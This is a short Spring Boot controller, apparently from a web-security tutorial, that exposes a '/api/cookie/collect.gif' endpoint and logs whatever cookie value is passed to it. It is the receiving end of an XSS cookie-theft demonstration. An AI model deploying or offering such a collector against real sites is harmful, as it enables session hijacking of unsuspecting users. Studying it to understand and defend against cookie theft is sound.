package com.tut.was.resource;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api/cookie")
public class CookieResource {

    Logger logger = LoggerFactory.getLogger(CookieResource.class);

    @GetMapping("/collect.gif")
    public void collect(@RequestParam(name="cookie") String data) {
        logger.info("User Cookie is : {}", data);
    }

}
